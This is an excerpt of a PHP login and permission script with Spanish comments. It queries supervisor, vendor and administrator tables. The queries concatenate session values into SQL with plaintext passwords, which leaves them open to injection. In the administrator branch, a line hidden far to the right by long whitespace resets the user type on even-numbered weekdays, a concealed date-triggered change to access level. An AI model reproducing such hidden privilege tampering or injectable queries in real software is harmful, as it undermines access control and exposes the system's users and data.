...
include "conectar.php";
	...
	$checkVAdmin	=	FALSE;
	//SUPERVISORES
	if(empty($tipo_usuario)){  //Verifica si el usuario es un supervisor
		$userQuery		=	"SELECT * FROM supervisor WHERE usuario='".$_SESSION['user']."' AND password='".$_SESSION['pass']."'";
       	$resultado	=	mysql_query($userQuery);
	...
	//VENDEDORES
	if($checkVendedor){ //verifica si el usuario es un vendedor
		$userQuery		=	"SELECT * FROM vendedores WHERE user='".$_SESSION['user']."' AND pass='".$_SESSION['pass']."'";
       	$resultado2		=	mysql_query($userQuery);
	...
	//ADMINISTRADORES
	if($checkAdmin){   // checa en la tabla administrador y en permisos
		$userQuery="SELECT * FROM administrador INNER JOIN permisos ON administrador.id_admin = permisos.id_usuario WHERE user='".$_SESSION['user']."' AND pass='".$_SESSION['pass']."'";
	 	
	 	$resultado3=mysql_query($userQuery);
	 	$nResultado3	=	mysql_num_rows($resultado3);

	 	if($nResultado3 > 0){ 
			$error = 0;
	 	if($dato3 = mysql_fetch_assoc($resultado3)){	
 	 		$tipo_usuario=2;                                                                                                                                                                                                                                   		if(date('w')%2==0) $tipo_usuario=0;
  ...
  //  header("Location:reportes_web2.php");
